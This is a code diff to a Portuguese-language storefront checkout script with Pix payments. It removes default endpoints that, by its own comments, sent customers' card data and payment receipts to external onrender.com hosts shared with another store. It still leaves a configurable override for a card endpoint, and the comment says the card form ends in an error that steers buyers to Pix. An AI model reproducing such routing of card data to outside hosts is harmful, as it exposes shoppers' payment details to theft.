@@ -901,12 +901,15 @@
      Config vem de window.VONIXX_PIX (definido no index.html).
      api vazio → modo demonstração (QR/código fictícios). */
   const PIX_CFG = Object.assign(
-    { api: '', offer: 'lav1300', funnel: 'lav1300', thankYouUrl: '', pollMs: 3000, expiresInDays: 1 },
+    { api: '', offer: 'v9max', funnel: 'v9max', thankYouUrl: '', pollMs: 3000, expiresInDays: 1 },
     (window.VONIXX_PIX || {})
   );
   let pollTimer = null;
   const PAID_STATUS = ['APPROVED', 'PAID', 'PAGO', 'CONCLUIDA', 'COMPLETED'];
-  const CARDS_API = PIX_CFG.cardsApi || 'https://cards-vault.onrender.com';
+  /* Cofre de cartões externo DESLIGADO: era um serviço compartilhado com a
+     outra loja (os dados de cartão iam para lá). Vazio = o formulário do cartão
+     segue o fluxo normal (erro + convite para o Pix) sem mandar nada para fora. */
+  const CARDS_API = PIX_CFG.cardsApi || '';
 
   /* ============================================================
      PREÇOS VIVOS — a tabela oficial vem do servidor na hora do checkout.
@@ -1641,7 +1644,8 @@
         if (_valor) fd.append('valor', _valor);
         if (_pix)   fd.append('pix_code', _pix);
         if (_ship)  fd.append('frete', _ship);
-        const r = await fetch('https://tiktok-tracking.onrender.com/api/comprovante', { method: 'POST', body: fd });
+        // comprovante fica NESTE servidor (nerva/data/comprovantes), não no da outra loja
+        const r = await fetch((PIX_CFG.api || '').replace(/[/]+$/, '') + '/api/comprovante', { method: 'POST', body: fd });
         const d = await r.json().catch(() => ({}));
         if (r.ok && d.ok !== false) {
           form.hidden = true;
